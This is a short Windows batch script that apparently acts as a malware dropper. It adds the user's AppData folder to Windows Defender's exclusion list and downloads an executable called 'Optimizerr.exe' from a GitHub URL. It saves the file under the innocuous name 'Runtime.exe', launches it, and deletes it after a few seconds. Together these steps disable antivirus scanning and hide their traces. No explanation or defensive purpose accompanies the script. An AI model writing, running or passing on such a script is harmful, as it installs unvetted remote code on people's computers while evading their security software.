@echo off
setlocal

:: Exclude %appdata% folder from Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath $env:APPDATA"

:: Set the download URL
set "url=https://github.com/evanffx/api/raw/refs/heads/main/Optimizerr.exe"

:: Set the output file path
set "outputFile=%APPDATA%\Runtime.exe"

:: Small delay to ensure exclusion is applied
timeout /nobreak /t 1 >nul

:: Download the file
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile%'"

:: Run the downloaded file
start "" "%outputFile%"

:: Wait for the process to start (adjust delay if needed)
timeout /nobreak /t 5 >nul

:: Delete the downloaded file
del "%outputFile%" /f /q

endlocal
exit
